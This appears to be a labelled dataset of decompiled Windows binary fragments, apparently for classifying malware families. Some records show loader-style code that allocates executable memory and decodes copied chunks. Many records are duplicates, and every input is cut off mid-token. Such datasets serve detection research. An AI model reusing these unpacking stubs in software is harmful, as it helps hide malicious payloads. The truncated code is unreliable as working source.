{"author": "sig17", "label": 2, "inputs": "unsigned int __usercall sub_10460B3@<eax>(int a1@<esi>)\n{\n  unsigned int result; // eax\n  int v2; // edx\n  int v3; // ecx\n  char *v4; // edi\n  int v5; // ecx\n  unsigned int v6; // ecx\n  int v7; // [esp+10h] [ebp-158h]\n  int v8; // [esp+4Ch] [ebp-11Ch]\n  int v9; // [esp+54h] [ebp-114h]\n  char **v10; // [esp+12Ch] [ebp-3Ch]\n\n  result = (unsigned int)VirtualAlloc(0, 0x8CC82u, 0x3000u, 0x40u);\n  if ( (result & 0x4140302) == 68420354 )\n  {\n    a1 = 1091;\n    v2 = v8;\n    if ( !v8 )\n    {\n      a1 = 0;\n      v9 = 1091;\n    }\n  }\n  if ( v2 != 32 )\n  {\n    v2 = 136935563;\n    a1 = 136935563;\n  }\n  if ( a1 == -68420354 )\n    v7 = a1 + 68420354;\n  v10 = &off_1090DDC;\n  v3 = v7;\n  v4 = (char *)result;\n  while ( 1 )\n  {\n    if ( (char *)v9 != v4 )\n    {\n      v5 = v2 + v3 + 76;\n      v2 = 0;\n      if ( v4 == (char *)v9 && v5 != 5967 && v5 == -102 )\n        v2 = 40361;\n    }\n    v6 = (unsigned int)v10[1];\n    if ( !*v10 )\n      break;\n    qmemcpy(v4, *v10, v6);\n    v4 += v6;\n    v3 = 0;\n    v10 += 2;\n  }\n  return result;\n}\n__int64 __stdcall sub_10465EC(_BYTE *a1)\n{\n  _BYTE *v1; // edi\n  __int16 *v2; // esi\n  __int16 v3; // ax\n  int v5; // [esp+88h] [ebp-60h]\n\n  v5 = 288321;\n  v1 = a1;\n  v2 = (__int16 *)a1;\n  do\n  {\n    v3 = *v2++;\n    *v1++ = HIBYTE(v3) + v3;\n    --v5;\n  }\n  while ( v5 );\n  return 288321i64;\n}\nint start()\n{\n  DWORD v0; // eax\n  int v1; // ebx\n  int v2; // eax\n  HMODULE v3; // eax\n  DWORD (__stdcall *FlsAlloc)(PFLS_CALLBACK_FUNCTION); // eax\n  unsigned __int64 v5; // rax\n  int v6; // ecx\n  int v7; // esi\n  int v8; // eax\n  unsigned __int64 v9; // rt2\n  unsigned int v10; // eax\n  unsigned int v11; // ebx\n  int v12; // esi\n  unsigned int v13; // eax\n  int v14; // edi\n  int v15; // ebx\n  int v16; // eax\n  int v17; // ecx\n  int v18; // edi\n  int v19; // edi\n  int v20; // edx\n  int v21; // edi\n  int v22; // edi\n  int v23; // edx\n  int v24; // ecx\n  char v25; // al\n  int v26; // esi\n  int v27; // ecx\n  int v28; // ebx\n  int v29; // eax\n  int v30; // esi\n  int v31; // eax\n  int v32; // edx\n  int v34; // [esp+44h] [eb"}
{"author": "sig17", "label": 2, "inputs": "// positive sp value has been detected, the output may be wrong!\nvoid __usercall start(int a1@<eax>, int a2@<edx>, int a3@<ecx>)\n{\n  int *v3; // ebx\n  unsigned __int8 *v4; // ebx\n  unsigned __int8 *v5; // edx\n  unsigned int *v6; // eax\n  int v7; // esi\n  unsigned int v8; // ecx\n  unsigned __int8 *v9; // eax\n  unsigned __int8 *v10; // ebx\n  unsigned int v11; // edi\n  int i; // edx\n  int v13; // eax\n  unsigned __int8 *v14; // ebp\n  int v15; // eax\n  unsigned __int16 v16; // dx\n  int v17; // ecx\n  unsigned int v18; // eax\n  int v19; // eax\n  char v20; // cl\n  int v21; // esi\n  int v22; // edx\n  int v23; // ebp\n  int v24; // eax\n  unsigned __int16 v25; // cx\n  unsigned int v26; // eax\n  bool v27; // zf\n  int v28; // edx\n  unsigned __int16 *v29; // ebp\n  int v30; // eax\n  unsigned __int16 v31; // cx\n  int v32; // esi\n  unsigned int v33; // eax\n  int v34; // eax\n  unsigned int v35; // edx\n  int v36; // esi\n  unsigned int v37; // ecx\n  int v38; // eax\n  unsigned int v39; // edx\n  unsigned int v40; // eax\n  unsigned int v41; // esi\n  unsigned int v42; // ebp\n  int v43; // ecx\n  unsigned __int16 *v44; // ecx\n  unsigned int v45; // esi\n  int v46; // eax\n  unsigned __int16 v47; // cx\n  unsigned int v48; // esi\n  int v49; // ebp\n  int v50; // eax\n  unsigned __int16 v51; // dx\n  unsigned int v52; // eax\n  unsigned int v53; // edx\n  unsigned int v54; // esi\n  int v55; // eax\n  unsigned __int16 v56; // dx\n  unsigned int v57; // eax\n  unsigned int v58; // eax\n  unsigned int v59; // ecx\n  int v60; // eax\n  unsigned __int16 v61; // dx\n  unsigned int v62; // eax\n  unsigned int v63; // ebp\n  int v64; // eax\n  unsigned __int16 v65; // dx\n  int v66; // ebp\n  unsigned int v67; // eax\n  unsigned int v68; // esi\n  int v69; // eax\n  unsigned int v70; // eax\n  unsigned int v71; // eax\n  int v72; // edx\n  int v73; // edx\n  int v74; // ebp\n  unsigned __int16 *v75; // esi\n  int v76; // eax\n  int v77; // ecx\n  unsigned int v78; // eax\n  int v79; // eax\n  int v80; // edx\n  int v81; // eax\n  int v82; // eax\n  int v83; // ebp\n  unsigned __int8 *v"}
{"author": "sig17", "label": 2, "inputs": "// positive sp value has been detected, the output may be wrong!\nvoid __usercall start(int a1@<eax>, int a2@<edx>, int a3@<ecx>)\n{\n  int *v3; // ebx\n  unsigned __int8 *v4; // ebx\n  unsigned __int8 *v5; // edx\n  unsigned int *v6; // eax\n  int v7; // esi\n  unsigned int v8; // ecx\n  unsigned __int8 *v9; // eax\n  unsigned __int8 *v10; // ebx\n  unsigned int v11; // edi\n  int i; // edx\n  int v13; // eax\n  unsigned __int8 *v14; // ebp\n  int v15; // eax\n  unsigned __int16 v16; // dx\n  int v17; // ecx\n  unsigned int v18; // eax\n  int v19; // eax\n  char v20; // cl\n  int v21; // esi\n  int v22; // edx\n  int v23; // ebp\n  int v24; // eax\n  unsigned __int16 v25; // cx\n  unsigned int v26; // eax\n  int v27; // edx\n  unsigned __int16 *v28; // ebp\n  int v29; // eax\n  unsigned __int16 v30; // cx\n  int v31; // esi\n  unsigned int v32; // eax\n  int v33; // eax\n  unsigned int v34; // edx\n  int v35; // esi\n  unsigned int v36; // ecx\n  int v37; // eax\n  unsigned int v38; // edx\n  unsigned int v39; // eax\n  unsigned int v40; // esi\n  unsigned int v41; // ebp\n  int v42; // ecx\n  unsigned __int16 *v43; // ecx\n  unsigned int v44; // esi\n  int v45; // eax\n  unsigned __int16 v46; // cx\n  unsigned int v47; // esi\n  int v48; // ebp\n  int v49; // eax\n  unsigned __int16 v50; // dx\n  unsigned int v51; // eax\n  unsigned int v52; // edx\n  unsigned int v53; // esi\n  int v54; // eax\n  unsigned __int16 v55; // dx\n  unsigned int v56; // eax\n  unsigned int v57; // eax\n  unsigned int v58; // ecx\n  int v59; // eax\n  unsigned __int16 v60; // dx\n  unsigned int v61; // eax\n  unsigned int v62; // ebp\n  int v63; // eax\n  unsigned __int16 v64; // dx\n  int v65; // ebp\n  unsigned int v66; // eax\n  unsigned int v67; // esi\n  int v68; // eax\n  unsigned int v69; // eax\n  unsigned int v70; // eax\n  int v71; // edx\n  int v72; // edx\n  int v73; // ebp\n  unsigned __int16 *v74; // esi\n  int v75; // eax\n  int v76; // ecx\n  unsigned int v77; // eax\n  int v78; // eax\n  int v79; // edx\n  int v80; // eax\n  int v81; // eax\n  int v82; // ebp\n  unsigned __int8 *v83; // esi\n  int v"}
{"author": "sig17", "label": 2, "inputs": "// positive sp value has been detected, the output may be wrong!\nvoid __usercall start(int a1@<eax>, int a2@<edx>, int a3@<ecx>, unsigned int a4@<ebp>)\n{\n  int *v4; // esi\n  int *v5; // edi\n  char v6; // al\n  bool v7; // cf\n  int v8; // ebx\n  int v9; // ebx\n  int v10; // ett\n  int i; // eax\n  bool v12; // cf\n  int v13; // ebx\n  int v14; // ebx\n  int v15; // ett\n  unsigned int v16; // eax\n  bool v17; // zf\n  int v18; // ebx\n  int v19; // ett\n  unsigned int v20; // eax\n  bool v21; // cf\n  int v22; // ebx\n  int v23; // ett\n  bool v24; // cf\n  int v25; // ebx\n  int v26; // ett\n  int v27; // ecx\n  int v28; // ecx\n  unsigned int v29; // eax\n  unsigned int v30; // eax\n  int v31; // eax\n  bool v32; // cf\n  int v33; // ebx\n  int v34; // ett\n  bool v35; // cf\n  int v36; // ebx\n  int v37; // ett\n  bool v38; // cf\n  int v39; // ebx\n  int v40; // ebx\n  int v41; // ett\n  bool v42; // zf\n  int v43; // ebx\n  int v44; // ett\n  unsigned int v45; // ecx\n  char *v46; // edx\n  char v47; // al\n  int v48; // eax\n  bool v49; // cc\n  int *v50; // esi\n  int *v51; // edi\n  int v52; // ecx\n  char v53; // al\n  unsigned __int8 v54; // al\n  int v55; // eax\n  int v56; // eax\n  char v57; // t0\n  unsigned __int8 v58; // bl\n  char *v59; // edi\n  int *v60; // ebx\n  int v61; // ebp\n  char v62; // al\n  char *v63; // ecx\n  unsigned __int8 v64; // al\n  int v65; // eax\n  _WORD *v66; // edi\n  int *j; // ebx\n  int v68; // eax\n  int v69; // eax\n  int v70; // eax\n  char v71; // tt\n  void (__cdecl *v72)(int *, int, int, int *); // ebp\n  int *v73; // edi\n  int v74[4]; // [esp+1Ch] [ebp-90h] BYREF\n  int v75; // [esp+2Ch] [ebp-80h] BYREF\n  int v76; // [esp+30h] [ebp-7Ch] BYREF\n  char *v77; // [esp+34h] [ebp-78h]\n  int *v78; // [esp+38h] [ebp-74h]\n  int v79; // [esp+3Ch] [ebp-70h]\n  int v80; // [esp+40h] [ebp-6Ch]\n  int v81; // [esp+44h] [ebp-68h]\n  int v82; // [esp+48h] [ebp-64h]\n  int *v83; // [esp+4Ch] [ebp-60h]\n  int v84; // [esp+50h] [ebp-5Ch]\n  int v85; // [esp+54h] [ebp-58h]\n  int v86; // [esp+58h] [ebp-54h]\n  int v87; // [esp+5Ch] [ebp-50h] BYREF\n\n  v83 "}
{"author": "sig17", "label": 2, "inputs": "int __stdcall sub_407E9B(_BYTE *a1)\n{\n  _BYTE *v1; // edi\n  __int16 *v2; // esi\n  __int16 v3; // ax\n  int v5; // [esp+54h] [ebp-B0h]\n\n  v5 = 27436;\n  v1 = a1;\n  v2 = (__int16 *)a1;\n  do\n  {\n    v3 = *v2++;\n    *v1++ = HIBYTE(v3) + v3;\n    --v5;\n  }\n  while ( v5 );\n  return 27436;\n}\nint __usercall start@<eax>(int a1@<edi>)\n{\n  int v1; // esi\n  int v2; // eax\n  int v3; // edi\n  unsigned __int64 v4; // rax\n  int v5; // ebx\n  unsigned __int64 v6; // rt2\n  unsigned int v7; // edi\n  int v8; // esi\n  unsigned int v9; // eax\n  int v10; // edx\n  int v11; // edi\n  int v12; // eax\n  int v13; // ecx\n  int result; // eax\n  int v16; // [esp+34h] [ebp-298h]\n  int v17; // [esp+3Ch] [ebp-290h]\n  int (*v18)(void); // [esp+64h] [ebp-268h]\n  int v19; // [esp+70h] [ebp-25Ch]\n  int v20; // [esp+C8h] [ebp-204h]\n  int v21; // [esp+D0h] [ebp-1FCh]\n  int v22; // [esp+FCh] [ebp-1D0h]\n  LARGE_INTEGER PerformanceCount; // [esp+110h] [ebp-1BCh] BYREF\n  int v24; // [esp+118h] [ebp-1B4h]\n  int v25; // [esp+11Ch] [ebp-1B0h]\n  int v26; // [esp+124h] [ebp-1A8h]\n  int v27; // [esp+12Ch] [ebp-1A0h]\n  int v28; // [esp+130h] [ebp-19Ch]\n  int v29; // [esp+134h] [ebp-198h]\n  int v30; // [esp+138h] [ebp-194h]\n  int v31; // [esp+13Ch] [ebp-190h]\n  int v32; // [esp+140h] [ebp-18Ch]\n  int v33; // [esp+148h] [ebp-184h]\n  int v34; // [esp+14Ch] [ebp-180h]\n  int v35; // [esp+150h] [ebp-17Ch]\n  int v36; // [esp+158h] [ebp-174h]\n  int v37; // [esp+15Ch] [ebp-170h]\n  struct _FILETIME SystemTimeAsFileTime; // [esp+160h] [ebp-16Ch] BYREF\n  int v39; // [esp+168h] [ebp-164h]\n  int v40; // [esp+16Ch] [ebp-160h]\n  int v41; // [esp+170h] [ebp-15Ch]\n  int v42; // [esp+174h] [ebp-158h]\n  int v43; // [esp+178h] [ebp-154h]\n  int v44; // [esp+184h] [ebp-148h]\n  int v45; // [esp+18Ch] [ebp-140h]\n  int v46; // [esp+194h] [ebp-138h]\n  int v47; // [esp+198h] [ebp-134h]\n  int v48; // [esp+19Ch] [ebp-130h]\n  int v49; // [esp+1A0h] [ebp-12Ch]\n  int v50; // [esp+1A4h] [ebp-128h]\n  int v51; // [esp+1A8h] [ebp-124h]\n  int v52; // [esp+1ACh] [ebp-120h]\n  int v53; // [esp+1B0h] [ebp-11C"}
{"author": "sig17", "label": 2, "inputs": "int __usercall start@<eax>(DWORD a1@<esi>)\n{\n  int v1; // ebx\n  int v2; // edi\n  DWORD v3; // eax\n  int v4; // edx\n  int v5; // eax\n  int v6; // esi\n  int v7; // edx\n  int v8; // ecx\n  int v9; // ebx\n  int v10; // eax\n  int v11; // edi\n  int v12; // eax\n  int v13; // edi\n  int v14; // ebx\n  HMODULE v15; // eax\n  int v16; // edi\n  HMODULE v17; // eax\n  int v18; // esi\n  int v19; // ecx\n  int v20; // eax\n  int v21; // edx\n  int v22; // et2\n  int v23; // ebx\n  int v24; // edx\n  unsigned __int64 v25; // rax\n  struct _TEB *v26; // edi\n  int v27; // edi\n  int v28; // esi\n  int v29; // edx\n  int v30; // eax\n  int v31; // ecx\n  int v32; // ebx\n  int v33; // edi\n  int v34; // eax\n  int v35; // eax\n  int v36; // edi\n  int v37; // edi\n  int result; // eax\n  unsigned int v39; // ebx\n  DWORD v40; // [esp+24h] [ebp-498h]\n  int v41; // [esp+80h] [ebp-43Ch]\n  int v42; // [esp+98h] [ebp-424h]\n  int v43; // [esp+A4h] [ebp-418h]\n  int v44; // [esp+B0h] [ebp-40Ch]\n  int v45; // [esp+DCh] [ebp-3E0h]\n  int v46; // [esp+F4h] [ebp-3C8h]\n  int v47; // [esp+110h] [ebp-3ACh]\n  DWORD v48; // [esp+174h] [ebp-348h]\n  int v49; // [esp+1C4h] [ebp-2F8h]\n  LARGE_INTEGER PerformanceCount; // [esp+1CCh] [ebp-2F0h] BYREF\n  int v51; // [esp+1D4h] [ebp-2E8h]\n  int v52; // [esp+1D8h] [ebp-2E4h]\n  int v53; // [esp+1DCh] [ebp-2E0h]\n  int v54; // [esp+1E0h] [ebp-2DCh]\n  int v55; // [esp+1E4h] [ebp-2D8h]\n  int v56; // [esp+1E8h] [ebp-2D4h]\n  int v57; // [esp+1F4h] [ebp-2C8h]\n  int v58; // [esp+1F8h] [ebp-2C4h]\n  int v59; // [esp+1FCh] [ebp-2C0h]\n  int v60; // [esp+200h] [ebp-2BCh]\n  int v61; // [esp+204h] [ebp-2B8h]\n  unsigned int v62; // [esp+208h] [ebp-2B4h]\n  int v63; // [esp+20Ch] [ebp-2B0h]\n  int v64; // [esp+218h] [ebp-2A4h]\n  int v65; // [esp+21Ch] [ebp-2A0h]\n  int v66; // [esp+220h] [ebp-29Ch]\n  int v67; // [esp+224h] [ebp-298h]\n  int v68; // [esp+22Ch] [ebp-290h]\n  int v69; // [esp+230h] [ebp-28Ch]\n  int v70; // [esp+234h] [ebp-288h]\n  int v71; // [esp+238h] [ebp-284h]\n  int v72; // [esp+23Ch] [ebp-280h]\n  int v73; // [esp+240h] [ebp-27Ch]\n  int v"}
{"author": "sig17", "label": 2, "inputs": "unsigned int __usercall sub_10460B3@<eax>(int a1@<esi>)\n{\n  unsigned int result; // eax\n  int v2; // edx\n  int v3; // ecx\n  char *v4; // edi\n  int v5; // ecx\n  unsigned int v6; // ecx\n  int v7; // [esp+10h] [ebp-158h]\n  int v8; // [esp+4Ch] [ebp-11Ch]\n  int v9; // [esp+54h] [ebp-114h]\n  char **v10; // [esp+12Ch] [ebp-3Ch]\n\n  result = (unsigned int)VirtualAlloc(0, 0x8CC82u, 0x3000u, 0x40u);\n  if ( (result & 0x4140302) == 68420354 )\n  {\n    a1 = 1091;\n    v2 = v8;\n    if ( !v8 )\n    {\n      a1 = 0;\n      v9 = 1091;\n    }\n  }\n  if ( v2 != 32 )\n  {\n    v2 = 136935563;\n    a1 = 136935563;\n  }\n  if ( a1 == -68420354 )\n    v7 = a1 + 68420354;\n  v10 = &off_1090DDC;\n  v3 = v7;\n  v4 = (char *)result;\n  while ( 1 )\n  {\n    if ( (char *)v9 != v4 )\n    {\n      v5 = v2 + v3 + 76;\n      v2 = 0;\n      if ( v4 == (char *)v9 && v5 != 5967 && v5 == -102 )\n        v2 = 40361;\n    }\n    v6 = (unsigned int)v10[1];\n    if ( !*v10 )\n      break;\n    qmemcpy(v4, *v10, v6);\n    v4 += v6;\n    v3 = 0;\n    v10 += 2;\n  }\n  return result;\n}\n__int64 __stdcall sub_10465EC(_BYTE *a1)\n{\n  _BYTE *v1; // edi\n  __int16 *v2; // esi\n  __int16 v3; // ax\n  int v5; // [esp+88h] [ebp-60h]\n\n  v5 = 288321;\n  v1 = a1;\n  v2 = (__int16 *)a1;\n  do\n  {\n    v3 = *v2++;\n    *v1++ = HIBYTE(v3) + v3;\n    --v5;\n  }\n  while ( v5 );\n  return 288321i64;\n}\nint start()\n{\n  DWORD v0; // eax\n  int v1; // ebx\n  int v2; // eax\n  HMODULE v3; // eax\n  DWORD (__stdcall *FlsAlloc)(PFLS_CALLBACK_FUNCTION); // eax\n  unsigned __int64 v5; // rax\n  int v6; // ecx\n  int v7; // esi\n  int v8; // eax\n  unsigned __int64 v9; // rt2\n  unsigned int v10; // eax\n  unsigned int v11; // ebx\n  int v12; // esi\n  unsigned int v13; // eax\n  int v14; // edi\n  int v15; // ebx\n  int v16; // eax\n  int v17; // ecx\n  int v18; // edi\n  int v19; // edi\n  int v20; // edx\n  int v21; // edi\n  int v22; // edi\n  int v23; // edx\n  int v24; // ecx\n  char v25; // al\n  int v26; // esi\n  int v27; // ecx\n  int v28; // ebx\n  int v29; // eax\n  int v30; // esi\n  int v31; // eax\n  int v32; // edx\n  int v34; // [esp+44h] [eb"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig25", "label": 3, "inputs": "// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return __imp_UnhandledExceptionFilter(ExceptionInfo);\n}\n// attributes: thunk\nBOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);\n}\n// attributes: thunk\nLPSTR __stdcall CharNextA(LPCSTR lpsz)\n{\n  return __imp_CharNextA(lpsz);\n}\n// attributes: thunk\nvoid __stdcall __noreturn ExitProcess(UINT uExitCode)\n{\n  __imp_ExitProcess(uExitCode);\n}\n// attributes: thunk\nint __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n  return __imp_MessageBoxA(hWnd, lpText, lpCaption, uType);\n}\n// attributes: thunk\nBOOL __stdcall FindClose(HANDLE hFindFile)\n{\n  return __imp_FindClose(hFindFile);\n}\n// attributes: thunk\nHANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)\n{\n  return __imp_FindFirstFileA(lpFileName, lpFindFileData);\n}\n// attributes: thunk\nBOOL __stdcall FreeLibrary(HMODULE hLibModule)\n{\n  return __imp_FreeLibrary(hLibModule);\n}\n// attributes: thunk\nLPSTR __stdcall GetCommandLineA()\n{\n  return __imp_GetCommandLineA();\n}\n// attributes: thunk\nint __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)\n{\n  return __imp_GetLocaleInfoA(Locale, LCType, lpLCData, cchData);\n}\n// a"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig25", "label": 3, "inputs": "// attributes: thunk\nHANDLE __stdcall GetStdHandle(DWORD nStdHandle)\n{\n  return __imp_GetStdHandle(nStdHandle);\n}\n// attributes: thunk\nvoid __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)\n{\n  __imp_RaiseException(dwExceptionCode, dwExceptionFlags, nNumberOfArguments, lpArguments);\n}\n// attributes: thunk\nvoid __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue)\n{\n  __imp_RtlUnwind(TargetFrame, TargetIp, ExceptionRecord, ReturnValue);\n}\n// attributes: thunk\nLONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)\n{\n  return __imp_UnhandledExceptionFilter(ExceptionInfo);\n}\n// attributes: thunk\nBOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)\n{\n  return __imp_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);\n}\n// attributes: thunk\nLPSTR __stdcall CharNextA(LPCSTR lpsz)\n{\n  return __imp_CharNextA(lpsz);\n}\n// attributes: thunk\nvoid __stdcall __noreturn ExitProcess(UINT uExitCode)\n{\n  __imp_ExitProcess(uExitCode);\n}\n// attributes: thunk\nint __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n  return __imp_MessageBoxA(hWnd, lpText, lpCaption, uType);\n}\n// attributes: thunk\nBOOL __stdcall FindClose(HANDLE hFindFile)\n{\n  return __imp_FindClose(hFindFile);\n}\n// attributes: thunk\nHANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)\n{\n  return __imp_FindFirstFileA(lpFileName, lpFindFileData);\n}\n// attributes: thunk\nBOOL __stdcall FreeLibrary(HMODULE hLibModule)\n{\n  return __imp_FreeLibrary(hLibModule);\n}\n// attributes: thunk\nLPSTR __stdcall GetCommandLineA()\n{\n  return __imp_GetCommandLineA();\n}\n// attributes: thunk\nint __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)\n{\n  return __imp_GetLocaleInfoA(Locale, LCType, lpLCData, cchData);\n}\n// a"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return 